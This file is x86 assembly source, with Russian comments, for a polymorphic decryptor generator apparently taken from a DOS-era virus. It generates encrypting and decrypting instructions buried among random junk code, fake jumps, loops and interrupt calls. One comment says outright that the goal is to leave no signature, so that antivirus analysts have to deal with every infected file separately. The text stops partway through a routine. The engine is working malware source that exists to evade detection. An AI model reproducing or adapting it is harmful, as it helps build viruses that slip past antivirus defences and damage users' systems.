;******************************************************************************
;S╫ad0W RANDOM CODE GENERATOR (SRCG) V1.0
;******************************************************************************
SRCG:		mov ax,CSIZE
		sub ax,1024
		call Rnd
		add ax,DECRYPTOR
		mov SegRegsOffset,ax

		push si
		mov si,ax
		mov cx,1024
		call MarkBlock
		pop si

		mov Flag,0
		call Create

		mov ax,EntryPoint
		add ax,DECRYPTOR
		mov MainDecryptorEntry,ax
		or OldFlags,88C0h


SegRegsCorrect:	mov si,SegRegsOffset
		mov cx,1024
		call UnmarkBlock

		mov ax,OldFlags
		mov Flag,ax
		mov REG_USED,10h
		mov si,MainDecryptorEntry

		mov cx,1F07h
		mov ax,2
		call Rnd
		inc ax
		xchg ax,cx
PopSeg:		xchg al,ah
		loop PopSeg

		push offset Created
		mov OLD_STACK,sp

		call InsertOneByteCommand
		or Flag,100h

		mov al,0Eh
		call InsertOneByteCommand
		and Flag,0FEFFh

		mov al,ah
		call InsertOneByteCommand
		or Flag,100h

		mov al,0Eh
		call InsertOneByteCommand
		and Flag,763Fh

;------------------------------------------------------------------------------
MakeGarbage:	push si
		sub si,DECRYPTOR
		mov EntryPoint,si
		pop si

		call RandomWord
		and ax,7
		cmp ax,7
		je Jumper

		call MakeTrash		;мусор
		jmp MakeGarbage

Jumper:		call MakeJmp		;переходы
		jmp MakeGarbage

;------------------------------------------------------------------------------
InsertOneByteCommand PROC NEAR
		call MakeTrash
		mov cx,1
		call CheckPlace
		mov es:[si],al
		ret
InsertOneByteCommand ENDP

;------------------------------------------------------------------------------
Created:	test Flag,8000h
		jz Finished
		jmp SegRegsCorrect

Finished:	mov cx,CSIZE		;забиваем свободное место мусором
		mov si,DECRYPTOR

NextByte:	push cx
		mov di,si
		call AdressDecode
		test es:[di],ch
		jnz UsedPlace
		call RandomWord
		mov es:[si],al
UsedPlace:	inc si
		pop cx
		loop NextByte

		mov dx,EntryPoint	;готово!
		retn

;------------------------------------------------------------------------------
Create:		mov REG_USED,10h
		mov OLD_STACK,sp

		call MakeJmp

Next:		push si			;адрес последней готовой инструкции.
		sub si,DECRYPTOR	;Если для следующей не хватит места
		mov EntryPoint,si	;то этот адрес - смещение точки входа
		pop si			;декриптора от его начала.

		mov ax,Flag
		mov OldFlags,ax

		call RandomWord
		mov di,offset TableProcAdress

SelectProc:	cmp al,[di]
		jbe CallProc
		add di,3
		jmp SelectProc
CallProc:	inc di
		call [di]
		jmp Next		;эх раз, еще раз, еще много много раз


TableProcAdress:
db 16
dw offset MakeJmp	;переходы
db 32
dw offset MakeTrash	;мусор
db 240
dw offset MakeCommand	;рабочие команды
db 255
dw offset MakeSubrout	;мусорные подпрограммы

;------------------------------------------------------------------------------
Quit:		mov sp,OLD_STACK	;восстановим стек
		ret


;##############################################################################
;------------------------------------------------------------------------------
;Безусловные переходы
;------------------------------------------------------------------------------
MakeJmp:	mov di,si
GetJump:	mov cx,7		;ищем блок в 7 байт
		call FindBlock
		jc Quit			;если не нашли - отваливаем
		add si,4

GetTypeOfJump:	call RandomWord		;определяем, какой вариант использовать
		and ax,3
		mov cl,al		;а вдруг нельзя?
		mov dx,10h
		rol dx,cl
		test Flag,dx
		jnz GetTypeOfJump

		rol ax,1
		mov bp,ax
		jmp ds:[offset TableOfJumps+bp]

;------------------------------------------------------------------------------
;Непосредственные переходы (типа JMP 100h)
;------------------------------------------------------------------------------
SimpleJumps:	mov al,es:[di]		;куда переходим?
		sub al,0E9h		;Дважды на грабли наступать не будем
		cmp al,2		;(Подозрительно, когда один jmp пока-
		jbe FakeReturn		;зывает на другой jmp)
		mov ax,di

MakeJmp2:	dec ax
		dec ax
		dec ax
		sub ax,si		;вычисляем смещение
		push ax
		add ax,80h
		cmp ax,0FFh
		pop ax
		ja NearJmp
		
		inc si
		mov byte ptr es:[si],0EBh	;jmp short
		mov byte ptr es:[si+1],al
		mov cx,2
		jmp JmpInserted

NearJmp:	mov byte ptr es:[si],0E9h	;jmp near
		mov word ptr es:[si+1],ax
		mov cx,3
JmpInserted:	jmp MarkBlock

;------------------------------------------------------------------------------
;Левые RET'ы  (типа PUSH 200h / RET)
;------------------------------------------------------------------------------
FakeReturn:	cmp byte ptr es:[di],68h
		je GetJump
		mov dx,3
		call InsertRET

		mov es:[si+1],ax
		mov byte ptr es:[si],68h	;PUSH ADRESS
		ret


;------------------------------------------------------------------------------
;косвенный JMP (for example JMP AX)
;------------------------------------------------------------------------------
JumpRegister:	call GetReg16		;какой регистр будем использовать?
		jc SimpleJumps		;No free regs... Shit!
		or REG_USED,al
		inc si

		push ax
		add ah,0D8h		;jmp reg
		mov al,0FFh
		mov es:[si],ax
		mov cx,2
		call MarkBlock
		pop dx

		add di,DECRYPTOR_OFFSET	;вычисляем адрес перехода
		sub di,DECRYPTOR
		mov cx,di
		call MakeTrash
		jmp LoadRegister	;адрес перехода - в регистр

;------------------------------------------------------------------------------
;ADVANCED FAKE RETURN (for example PUSH AX / RET)
;------------------------------------------------------------------------------
AdvFakeReturn:	call GetReg16
		jc SimpleJumps
L2:		or REG_USED,al
		push ax
		mov dx,1
		call InsertRET
		mov cx,ax
		pop dx
		mov al,dh
		add al,48h
		mov es:[si],al		;push reg
		call MakeTrash
		jmp LoadRegister	;адрес перехода - в регистр


;------------------------------------------------------------------------------
InsertRET:	inc si				;push Adress / ret
		inc si
		mov byte ptr es:[si],0C3h	;RET
		mov cx,1
		call MarkBlock

		push di
		push Flag
		or Flag,100h			;Без PUSH / POP

		push dx
		call MakeTrash			;разбавим...
		pop cx

		call CheckPlace
		pop Flag
		pop ax
		sub ax,DECRYPTOR
		add ax,DECRYPTOR_OFFSET
		ret

TableOfJumps:
dw offset SimpleJumps
dw offset FakeReturn
dw offset JumpRegister
dw offset AdvFakeReturn


;##############################################################################
;------------------------------------------------------------------------------
;создает 1 - 8 мусорных команд
;------------------------------------------------------------------------------
MakeTrash:	push ax
		push cx
		push dx
		push bx
		push bp

		call RandomWord
		and ax,7
		mov cx,ax
		inc cx

		mov ax,7
		test Flag,100h
		jz NextInstruction
		dec ax

NextInstruction:	push cx
			push ax
			call Trash
			pop ax
			pop cx
			loop NextInstruction

		pop bp
		pop bx
		pop dx
		pop cx
		pop ax
		ret

;------------------------------------------------------------------------------
;формирователь мусорных инструкций
;------------------------------------------------------------------------------
Trash:		call Rnd	;получаем случайное число
		rol ax,1
		mov bp,ax
		jmp ds:[offset TableOfOffsets+bp]

TableOfOffsets:
dw offset Table1
dw offset Table2
dw offset Table3
dw offset Table4
dw offset MakeXCHG
dw offset Interrupt
dw offset MakePushPop

;------------------------------------------------------------------------------
;Эта приблуда создает код вида:	mov ax,NN  int NN. Используется
;таблица FunctionTable.
;------------------------------------------------------------------------------
Interrupt:	call RandomWord	;рассчет адреса в таблице INT`ов
		and ax,0Fh
		rol ax,2
		mov bp,ax
		mov al,ds:[offset FunctionTable+bp]	;получаем байт статуса

		test REG_USED,al			;ничего не испортим?
		jnz AlreadyUsed

		mov cx,2				;2 байта под 0CDh,NN
		call CheckPlace

		mov ax,ds:[offset FunctionTable+bp]	;получаем номер INT`а
		mov al,0CDh
		mov es:[si],ax				;ставим команду INT NN

		mov ax,ds:[offset FunctionTable+2+bp]	;номер функции в AX(AH)
		cmp ax,0FFFFh				;номер функции не нужен
		jne GetFunction
AlreadyUsed:	ret

GetFunction:	or REG_USED,1
		cmp al,0FFh	;AH
		je RegisterAH

		mov bp,ax
		mov dh,8
		jmp OneInstruction

RegisterAH:	mov cl,ah
		mov bp,cx
		mov dh,4
		jmp OneInstruction

;------------------------------------------------------------------------------
;Мусор типа PUSH AX, PUSH DI, PUSH ES, PUSHF
;------------------------------------------------------------------------------
MakePushPop:	test Flag,2000h
		jnz MakePush

MakePop:	call GetReg16
		jc NotGoodIdea
		jmp InsertCode

MakePush:	call RandomWord
		and ax,0Fh
		mov bp,ax
		mov ah,ds:[bp+offset PushReg]

InsertCode:	mov cx,1
		call CheckBlock
		jc NotGoodIdea
		dec si
		add ah,50h
		mov es:[si],ah
		mov cx,1
		call MarkBlock
		xor Flag,2000h	;push, если был pop, и pop, если был push
NotGoodIdea:	retn

PushReg:
db 0,1,2,3,4,5,6,7
db 9Ch-50h,6-50h,0Eh-50h,1Eh-50h,16h-50h
db 6-50h,0Eh-50h,1Eh-50h

;------------------------------------------------------------------------------
;однобайтовый мусор типа INT 3, LODSB и т.п.
;------------------------------------------------------------------------------
Table1:		mov di,offset Trash1
		call TakeCommand

		and bl,REG_USED	;ничего не испортим?
		jnz Table1	;FUCK!!! не пойдет...
		mov cx,1
		call CheckPlace
		mov es:[si],bh	;ставим команду
		retn		;сваливаем

;------------------------------------------------------------------------------
;мусор типа AND AX,BX  SUB DX,[1085] и т.п.
;------------------------------------------------------------------------------
Table2:		mov di,offset Trash2
		call TakeCommand

		or bh,bh
		jz WithoutJCC

		test Flag,800h
		jnz Table2

		push dx
		push bx
		call MakeJCC
		pop bx
		pop dx

WithoutJCC:	test dl,2	;операнд - word
		jz UseByte
		inc bl

UseByte:	call RandomWord
		and al,0BFh	;2-ой операнд - ячейка памяти

		test dl,1	;2ой операнд - регистр
		jnz Memory

		and al,3Fh
		or al,0C0h

Memory:		mov dh,al
		cmp bh,1	;cmp и test регистры не портят
		je GoodTrash

		mov cl,dh	;смотрим, какой регистр будет испорчен
		shr cl,3
		and cl,7
		call VerifyRegister
		jnz WithoutPrefix

GoodTrash:	mov bh,dh	;cx - код инструкции
		cmp bh,0C0h
		jb CorrectAdr	;операнд - память

AdrNotNeed:	mov cx,2	;помечаем блок
		call CheckPlace

MakeCode:	mov es:[si],bx	;ставим команду
		ret

CorrectAdr:	test dl,2
		jnz DirectAdrMode

		cmp bh,3Fh
		ja AnotherAdrMode
		mov cl,bh
		and cl,7
		cmp cl,6	;непосредственная адресация?
		jne AdrNotNeed

GetRND:		call RandomWord	;случайное число (адрес)
		cmp ax,0FFFFh	;чтоб не нарваться на int 0Dh
		je GetRND

		mov cx,4	;длина команды 4 байта
		call CheckPlace

		mov es:[si+2],ax
		mov es:[si],bx	;ставим команду

RandomPrefix:	mov cx,1
		call CheckBlock
		jc WithoutPrefix
		
		call RandomWord
		test al,0C0h
		jz WithoutPrefix

		dec si
		mov cl,2Eh
		test al,1
		jz SegmentDS
		mov cl,26h
SegmentDS:	mov es:[si],cl
		mov cx,1
		call MarkBlock
WithoutPrefix:	retn

DirectAdrMode:	and bh,038h	;чтобы не получилось mov bx,[si] при si=FFFFh,
		or bh,6		;(если кто не пробовал - виснет все к ЕБН:(
		jmp GetRND	;используем только mov bx,[ADRESS] и т.п.

AnotherAdrMode:	mov cx,3	;... byte ptr [bp+NN] or ... byte ptr [si+di+N]
		cmp bh,80h	; [... + WORD] ?
		jb GetPlace
		inc cx
GetPlace:	call CheckPlace
		mov es:[si],bx
		call RandomWord
		mov es:[si+2],al
		cmp bh,80h
		jb OnlyOne
		mov es:[si+2],ax
OnlyOne:	jmp RandomPrefix
		

;------------------------------------------------------------------------------
;мусор типа NOT BX,  ROL DX,CL и т.п.
;------------------------------------------------------------------------------
Table3:		mov di,offset Trash3
		call TakeCommand
		jnz WithoutPrefix

		test dl,2
		jz OneByte
		inc bl
OneByte:	add bh,dh
		jmp AdrNotNeed

;------------------------------------------------------------------------------
;мусор типа ADD DX,1234h  CMP AX,FFFh
;------------------------------------------------------------------------------
Table4:		mov di,offset Trash4
		call TakeCommand
		jnz WithoutPrefix

		cmp bx,0F880h
		je JCC
		cmp bx,0C0F6h
		jne Continue

JCC:		test Flag,800h
		jnz Table4

		push dx
		push bx
		call MakeJCC
		pop bx
		pop dx

Continue:	mov cx,3
		or bl,bl
		jz MovRegNumber

		or dh,dh
		jnz NotAccumulator

		cmp bl,0F6h
		jne NotTEST

		xchg bl,bh
		sub bh,4Eh
		jmp LetsGo

NotTEST:	sub bh,0BCh
LetsGo:		xor bl,bl
MovRegNumber:	dec cx
NotAccumulator:	test dl,2	;Word?
		jz OperandNotWord
		inc cx

OperandNotWord:	call CheckPlace
		add si,cx
		dec si
		dec si
		call RandomWord
		mov es:[si],ax
		or bl,bl
		jz Accumulator

		add bh,dh
		test dl,2
		jz OperandIsByte
		inc bl
		dec si
OperandIsByte:	dec si
		mov es:[si],bx
		jmp L11

Accumulator:	cmp bh,0B0h
		je MovReg
		test dl,2
		jz L10
		inc bh
		jmp L12

MovReg:		add bh,dh
		test dl,2
		jz L10
		add bh,8
L12:		dec si
L10:		mov es:[si],bh
L11:		ret

;------------------------------------------------------------------------------
;XCHG AX,CX  XCHG AL,BH  XCHG CX,DX
;------------------------------------------------------------------------------
MakeXCHG:	call GetReg	;take 2 regs
		mov cx,ax
		call GetReg
		jc Ready

		push cx
		push ax
		mov cl,al
		mov dl,ch
		rol dl,1
		call VerifyRegister
		pop ax
		pop cx
		jnz Ready

		cmp cx,100h	;use AX
		jne NotUseAX

		mov bx,90h
		add bl,cl
		add bl,al
		mov cx,1
		jmp Insert

NotUseAX:	mov bx,0C086h
		add bl,ch
		add bh,cl
		rol al,3
		add bh,al
		mov cx,2

Insert:		call CheckPlace
		mov es:[si],bl
		cmp cx,1
		je Ready
		mov es:[si],bx
Ready:		ret

;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
;вставка шифрующей инструкции (типа NEG WORD PTR [SI], INC BYTE PTR DS:[12],
;XOR [BP],AX и т.п.)Прикол состоит в том, что никакой сигнатуры в таком декрип-
;торе в принципе быть не может и AVерам придется ебаться над каждым файликом.
;Недостаток- охуенный размер декриптора (правда и эмулить это дело тоже заебет)
;++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++
MakeCommand:	mov AdrLOOP,si
		mov cx,6	;ну всяко не больше 6 байт...
		call CheckBlock
		jc Ready

		call RandomWord	;получаем RND
		mov dx,ax
		and dx,3F03h
		and ax,15
		mov di,ax	;вычисляем адрес команды в таблице
		add di,ax
		add di,ax
		add di,offset TableOfCommands

		mov cl,[di]	;сохраняем статус команды
		mov Status,cl
		and Status,0F0h
		or Status,dl
		inc di
		mov bx,[di]	;берем команду
		and cx,15	;ищем зеркальную
		mov di,cx
		add di,cx
		add di,cx
		add di,offset TableOfCommands
		inc di

		mov ax,[di]	;получаем зеркальную команду
		add ah,6	;непосредственная адресация

		mov di,offset Cryptor	;там собираем шифровщик

		test dl,2	;bit 1=1 - word, 0 - byte
		jz SizeByte
		inc bl		;если word - 1 байт увеличиваем на 1
		inc al

SizeByte:	mov word ptr [di],ax	;ставим зеркало
		inc di
		inc di

		call RandomWord
		test al,3
		jz CryptDecryptor	;криптуем основной код или декриптор

CryptMainCode:	shr dx,1
		and dx,1
		mov ax,CRYPT_LEN
		sub ax,dx
		call Rnd                ;поиск адреса в коде для криптования
		push ax
		add ax,CRYPT_ADR
		mov AdrPart1,ax
		mov word ptr [di],ax    ;ставим к зеркалу адрес
		pop ax
		add ax,CODE_OFFSET
		mov bp,ax
		jmp AdressSelected

CryptDecryptor:	mov bp,si
		mov ch,1
		mov cl,dl
		shr cl,1
		and cl,ch
		inc cl
		push dx
		call FindBlock
		pop dx
		xchg bp,si
		mov word ptr [di],bp	;ставим к зеркалу адрес
		mov cx,bp
		sub cx,si
		cmp cx,32
		jb CryptMainCode
		mov AdrPart1,bp
		sub bp,DECRYPTOR
		add bp,DECRYPTOR_OFFSET

AdressSelected:	inc di
		inc di

GetCommand:	call RandomWord	;модификация команды
		and ax,3Fh
		push ax		;определяем используемые операнды
		mov cl,8
		div cl
		mov dx,ax	;dl - 2 операнд, dh - 1 операнд
		pop ax

GetRegisters:	mov cl,dh
		and cx,7
		rol cx,1
		add cx,offset TableOfRegisters
		push di
		mov di,cx
		mov cx,[di]
		pop di

TestRegisters:	mov ah,dl
		or ah,8
		test Status,2
		jnz TwoBytes
		and ah,0Bh
TwoBytes:	cmp ah,cl
		je GetCommand
		cmp ah,ch
		je GetCommand
		cmp ah,12
		je GetCommand

		push ax
		call RandomWord
		mov Argument,ax
		pop ax

		test Status,0E0h
		jnz GetOperand2
		add bh,dh	;2й операнд не нужен
		mov dl,0FFh
		mov byte ptr [di],0C3h
		jmp GetOperand1

GetOperand2:	test Status,80h	;2й операнд cl ?
		jz NotCL
		add bh,dh
		mov dl,1
		mov word ptr [di],0C3h

NotCL:		test Status,20h	;регистр ?
		jz NotRegister
		add bh,al

		cmp bl,88h
		je ItsMov
		cmp bl,89h
		je ItsMov
		jmp ItsNotMov
ItsMov:		push di
		mov di,AdrPart1
		mov ax,es:[di]
		mov Argument,ax
		pop di
		call RandomWord
		jmp MakeMirror

ItsNotMov:	mov ax,Argument
MakeMirror:	mov [di],ax

		inc di
		test Status,2
		jz FinishIt1
		inc di
FinishIt1:	mov byte ptr [di],0C3h

NotRegister:	test Status,40h	;число ?
		jz GetOperand1
		add bh,dh
		mov dl,0FFh

		cmp bl,0C6h
		je MovCommand
		cmp bl,0C7h
		je MovCommand
		jmp AnotherCommand
MovCommand:	push di
		mov di,AdrPart1
		mov ax,es:[di]
		mov Argument,ax
		pop di
		call RandomWord
		jmp AddArgument

AnotherCommand:	mov ax,Argument
AddArgument:	mov [di],ax

		inc di
		test Status,2
		jz FinishIt2
		inc di
FinishIt2:	mov byte ptr [di],0C3h

		mov ax,Argument
		dec si
		test Status,2	;byte ?
		jnz ItsNotByte
		mov es:[si],al
		jmp GetOperand1

ItsNotByte:	dec si
		mov es:[si],ax

GetOperand1:	cmp dh,6	;1й операнд - число (просто адрес)
		jne NotAdress
		dec si
		dec si
		mov es:[si],bp	;ставим адрес
		mov cx,0FFFFh	;да и хрен с ним!

NotAdress:	dec si		;ставим команду
		dec si
		mov es:[si],bx

MakePrefix:	push dx
		push cx
		push bp

		cmp ch,0Dh
		jne RndPref

		dec si
		mov ax,3
		call Rnd

		mov cl,3Eh
		or al,al
		jz Pref

		mov cl,26h
		cmp al,1
		jz Pref

		mov cl,2Eh

Pref:		mov es:[si],cl

		mov cx,1
		call MarkBlock
		jmp Mark

RndPref:	call RandomPrefix

Mark:		mov cx,AdrLOOP
		sub cx,si
		call MarkBlock

		pop bp
		pop cx
		pop dx

		cmp ch,0FFh
		je OneRegister

		call RandomWord
		mov AdrPart2,ax
		sub bp,ax
OneRegister:	mov AdrPart1,bp
		mov Reg1,cl
		mov Reg2,ch
		mov al,Status
		and al,2
		rol al,2
		or dl,al
		mov Reg3,dl

		xor bp,bp
		mov di,offset Reg1
		mov cx,3
MarkNext:	push cx
		mov cl,[di]
		cmp cl,0FFh
		je DontNeed
		inc bp
		test cl,8
		jnz MarkIt
		and cl,3
MarkIt:		call MarkRegister
DontNeed:	add di,3
		pop cx
		loop MarkNext

NextRandom:	or bp,bp
		jz Crypt
		call RandomWord
		and ax,3
		cmp ax,3
		je NextRandom
		mov di,ax
		add di,ax
		add di,ax
		add di,offset Reg1
		mov dh,[di]
		cmp dh,0FFh
		je NextRandom
		mov byte ptr [di],0FFh
		inc di
		mov cx,[di]
		dec bp
		push bp
		call LoadRegister
		pop bp
		jmp NextRandom

;а теперь надо зашифровать то, что мы расшифровываем		
Crypt:		mov cx,Argument
		jmp Prefix

TableOfRegisters:
dw 0B0Eh
dw 0B0Fh
dw 0D0Eh
dw 0D0Fh
dw 0FF0Eh
dw 0FF0Fh
dw 0FFFFh
dw 0FF0Bh


;------------------------------------------------------------------------------
;Подпрограмма генерирует случайный код, заряжающий заданный регистр заданным
;числом. Номер регистра в dh (0=al, 1=cl, 8=ax, 0Ch=sp, 0Dh=bp), число в cx.
;------------------------------------------------------------------------------
LoadRegister:	mov bp,cx	;сохраняем число, которое нужно засунуть в reg
		call RandomWord	;Сколько команд использовать?
		and ax,1
		inc ax
		mov cx,ax	;1 - 2

NextCommand:	push cx		;закрутили цикл
		call MakeTrash

		call RandomWord	;Что будем делать дальше?
		and ax,7
		rol ax,1
		add ax,offset TableOfProc
		mov di,ax
		call [di]
		pop cx
		loop NextCommand;следующая инструкция

		call MakeTrash
		
OneInstruction:	mov cx,dx
		shr cx,11
		inc cx
		inc cx
		call CheckPlace

		mov al,dh	;AH - код MOV REG,NUMBER
		and al,0Fh
		add al,0B0h

		mov cx,bp
		mov es:[si+1],cl;аргумент для MOV REG,NUMBER

		test dh,8	;8 или 16 бит?
		jz L
		mov es:[si+1],cx

L:		mov es:[si],al	;код команды

FreeRegs:	mov cl,dh
		test cl,8
		jnz ItsWord
		and cl,3
ItsWord:	jmp UnmarkRegister

;------------------------------------------------------------------------------
;MOV/XCHG Reg1,Reg2
;------------------------------------------------------------------------------
MovRegReg:	call RandomWord
		and al,7		;номер регистра в al
		mov cl,al
		test dh,8
		jnz NotByte1
		and cl,3
NotByte1:	mov ah,1
		rol ah,cl
		test ah,REG_USED	;Используется?
		jnz Done		;Shit! What's fuck!!!

		mov cx,2
		call CheckPlace

		or al,al
		je L17
		test dh,7
		jz L17
		mov bx,0C087h		;XCHG
		push ax
		call RandomWord
		test al,1
		pop ax
		jz L16
L17:		mov bx,0C08Bh		;код MOV AX,AX
L16:		or REG_USED,ah		;register now used
		add bh,al		;register No 1

		mov cl,dh
		and cl,7
		push cx
		rol cl,3
		add bh,cl		;register 2
		pop cx
		test dh,8
		jnz NotByte2
		dec bl
		and cl,3
NotByte2:	call UnmarkRegister	;теперь свободен

		and dh,0F8h		;use register No 1
		or dh,al

InsertCommand:	mov es:[si],bx		;ставим код команды
Done:		ret			;сделано!

;------------------------------------------------------------------------------
;ADD Reg,NN  SUB Reg,NN  XOR Reg,NN
;------------------------------------------------------------------------------
AddRegNumber:	mov bx,0C080h	;код ADD REG,NN
		call MakeIt
		sub bp,ax
		ret

SubRegNumber:	mov bx,0E880h	;код SUB REG,NN
		call MakeIt
		add bp,ax
		ret

XorRegNumber:	mov bx,0F080h	;код XOR REG,NN
		call MakeIt
		xor bp,ax
		ret

MakeIt:		mov cx,3
		test dh,7
		jnz NotAlAx

		sub bx,0BC80h	;используем накопитель
		test dh,8
		jz L3
		inc bh
L3:		dec cx

NotAlAx:	mov dl,dh
		and dl,7
		add bh,dl

		test dh,8
		jz Byte3
		inc bl
		inc cx

Byte3:		call CheckPlace
		add si,cx

		call RandomWord;получаем случайное число

		dec si
		mov es:[si],al

		test dh,8
		jz NotWord2
		dec si
		mov word ptr es:[si],ax

NotWord2:	dec si
Byte2:		cmp bl,1
		ja NotAc
		mov es:[si],bh
		ret
NotAc:		dec si
		jmp InsertCommand

;------------------------------------------------------------------------------
;INC Reg  DEC Reg
;------------------------------------------------------------------------------
IncReg:		dec bp
		mov bx,0C0FEh
		jmp MakeIncDec

DecReg:		inc bp
		mov bx,0C8FEh

MakeIncDec:	mov cx,2
		test dh,8h
		jz TwoByteOpcode
		and bx,7F00h
		dec cx
TwoByteOpcode:	call CheckPlace
		mov cl,dh
		and cl,7
		add bh,cl
		or bl,bl
		jz TwoByteReg
		jmp InsertCommand
TwoByteReg:	mov es:[si],bh
 		ret


;------------------------------------------------------------------------------
;NEG Reg  NOT Reg
;------------------------------------------------------------------------------
NotReg:		not bp
		mov bx,0D0F6h
		jmp DoIt

NegReg:		neg bp
		mov bx,0D8F6h

DoIt:		mov cx,2
		call CheckPlace

		test dh,8
		jz Byte4
		inc bl
Byte4:		mov al,dh
		and al,7
		add bh,al
		jmp InsertCommand


TableOfProc:
dw offset MovRegReg
dw offset AddRegNumber
dw offset SubRegNumber
dw offset XorRegNumber
dw offset IncReg
dw offset DecReg
dw offset NotReg
dw offset NegReg


;------------------------------------------------------------------------------
;процедура создает левые условные переходы (типа JE, JNE и т.п.)
;------------------------------------------------------------------------------
MakeJCC:	push Flag
		or Flag,900h		;disable PUSH/POP and CMP/TEST
		mov cx,5
		call CheckPlace
		add si,cx
		push si

		mov cx,3
		call FindBlock
		pop ax
		jnc L20
		jmp Quit

L20:		push ax
		call MakeJmp2

		call MakeTrash

		mov ax,si
		pop si
		mov cx,5
		sub si,cx
		call UnmarkBlock
		inc si
		inc si
		call MakeJmp2

		cmp byte ptr es:[si],0E9h
		je JmpCondition

		call RandomWord
		and al,15
		add al,70h
		mov es:[si],al
		jmp NotEnoughPlace

JmpCondition:	dec si
		dec si
		call RandomWord
		and ax,15
		add al,70h
		mov ah,3
		mov es:[si],ax
		mov cx,2
		call MarkBlock

NotEnoughPlace:	pop Flag
		ret


;------------------------------------------------------------------------------
;процедура создает левые циклы и подпрограммы
;------------------------------------------------------------------------------
MakeSubrout:	call RandomWord
		test al,1
		jz MakeLOOP

		mov cx,3	;проверяем, достаточно ли места
		call CheckPlace

		push si		;ищем пустой участок в декрипторе
		mov cx,1
		call FindBlock
		jnc L18
		jmp Quit	;ОХУЕТЬ! Даже байта не осталось...

L18:		mov byte ptr es:[si],0C3h
		mov cx,1
		call MarkBlock

		or Flag,100h	;никаких PUSH / POP
		call MakeTrash
		and Flag,0FEFFh

		mov ax,si
		pop si
		sub ax,si
		sub ax,3
		mov es:[si+1],ax
		mov byte ptr es:[si],0E8h
		ret

;------------------------------------------------------------------------------
;генератор LOOPов, чтоб ламеры не заLOOPались;)
;------------------------------------------------------------------------------
MakeLOOP:	mov cx,2		;зарезервируем свободное место для LOOP
		call CheckPlace
		push si			;адрес запомним

		or REG_USED,2		;cx не трогать!!!

		or Flag,100h
		call MakeTrash		;делаем кучу мусора
		and Flag,0FEFFh

		mov ax,si		;проверяем, сможем ли мы достать
		pop si			;до начала цикла
		push ax
		sub ax,si
		cmp ax,0FF82h
		jb KillLOOP		;руки коротки... suxxx...

InsertLOOP:	dec ax
		dec ax
		mov ah,0E2h		;дотянулись? ставим LOOP
		xchg al,ah
		mov es:[si],ax

		pop si
		call RandomWord		;сколько раз крутить цикл?
		and ax,0FFFh		;на 386SX могут подумать, что повисло:(
		mov cx,ax		;cx - число повторений
		mov dh,9
		call LoadRegister
		ret

KillLOOP:	and REG_USED,0FDh	;чтоб cx не остался без дела
		mov word ptr es:[si],01CCDh
		pop si
		ret

;------------------------------------------------------------------------------
;Подпрограммы поиска свободного места в декрипторе, маркировки блоков, генера-
;ции случайных чисел и т.п.
;------------------------------------------------------------------------------
;Поиск пустых (или не пустых) участков. CX - длина, на выходе SI - адрес начала
;------------------------------------------------------------------------------
FindBlock:	and Flag,0BFFFh
		sub byte ptr [Jump],ch	;jz или jnz? Быть или не быть?:-)
		push di			;(если ch=1 ищем занятый участок)
		xor ch,ch
		mov dx,cx

		mov ax,CSIZE
		call Rnd		;откуда начнем?
		mov si,ax

AnotherPlace:	add si,dx	;а не выходим ли мы за пределы декриптора?
		cmp si,CSIZE
		ja Outside
		sub si,dx

		mov cx,si
		and cl,7
		mov al,1
		rol al,cl
		mov di,si
		shr di,3
		add di,TABLE_ADRESS

		mov cx,dx

CheckNextByte:	test es:[di],al
Jump:		jnz BadPlace
		rcl al,1
		jnc OldByteInTable
		rcl al,1
		inc di
OldByteInTable:	loop CheckNextByte

		add si,DECRYPTOR

Restore:	mov byte ptr [Jump],75h	;нашли...
		pop di
		ret

BadPlace:	add si,dx
		jmp AnotherPlace

Outside:	test Flag,4000h
		jnz NoPlace		;попытаться еще раз?
		or Flag,4000h
		xor si,si		;с самого начала
		jmp AnotherPlace
NoPlace:	stc
		jmp Restore


;------------------------------------------------------------------------------
;Проверка места. CX - длина, SI - адрес конца. Если занято - ставится CF
;------------------------------------------------------------------------------
CheckBlock:	push di
		mov di,si
		sub di,cx
		jc ThereIsNoPlace
		cmp di,DECRYPTOR
		jb ThereIsNoPlace
CheckByte:	push di
		push cx
		call AdressDecode
		test es:[di],ch
		pop cx
		pop di
		jnz ThereIsNoPlace
		inc di
		loop CheckByte
		pop di
		ret
ThereIsNoPlace:	pop di
		stc
		ret


;------------------------------------------------------------------------------
;Тоже проверяет свободное место, но, если места не хватает, делает переход
;------------------------------------------------------------------------------
CheckPlace:	push ax
		push cx
		push dx
		push bx
		push bp

L7:		push cx
		call CheckBlock
		pop cx
		jc InsertJMP
		sub si,cx
		call MarkBlock

		pop bp
		pop bx
		pop dx
		pop cx
		pop ax
		retn

InsertJMP:	push cx
		call MakeJmp
		pop cx
		jmp L7


;------------------------------------------------------------------------------
;(Раз)Маркировка блока: cx - длина блока, si - адрес блока в расшифровщике
;------------------------------------------------------------------------------
MarkBlock:	push di
		mov di,si
MarkNextByte:	push di
		push cx
		call AdressDecode
		or es:[di],ch
		pop cx
		pop di
		inc di
		loop MarkNextByte
		pop di
		ret

UnmarkBlock:	push di
		mov di,si
UnmarkNextByte:	push di
		push cx
		call AdressDecode
		not ch
		and es:[di],ch
		pop cx
		pop di
		inc di
		loop UnmarkNextByte
		pop di
		ret

;------------------------------------------------------------------------------
AdressDecode:	sub di,DECRYPTOR
		mov cx,di
		and cl,7
		mov ch,1
		rol ch,cl
		shr di,3
		add di,TABLE_ADRESS
		ret

;------------------------------------------------------------------------------
VerifyRegister:	test dl,2
		jnz OpWord
		and cl,3
OpWord:		mov al,1
		rol al,cl
		and al,REG_USED
		ret

;------------------------------------------------------------------------------
TakeCommand:	call RandomWord
		mov dx,ax
		and dx,703h
		and ax,15
		rol ax,1
		add di,ax
		mov bx,[di]
		mov cl,dh
		call VerifyRegister
		ret

;------------------------------------------------------------------------------
GetReg:		call GetReg16
		jc NoFreeRegs
		push cx

NextRegister:	call RandomWord
		and ax,107h
		mov cl,al
		test ah,1
		jnz Check
		and cl,3

Check:		mov ch,1
		rol ch,cl
		test ch,REG_USED
		jnz NextRegister
		pop cx
		ret
;------------------------------------------------------------------------------
GetReg16:	cmp REG_USED,0FFh
		jne FindReg
NoFreeRegs:	stc
		ret

FindReg:	push cx

GetAnotherReg:	call RandomWord
		and al,7
		mov cl,1
		xchg al,cl
		rol al,cl
		test al,REG_USED
		jnz GetAnotherReg

		or cl,8
		mov ah,cl
		pop cx
		ret
;------------------------------------------------------------------------------
MarkRegister:	push ax
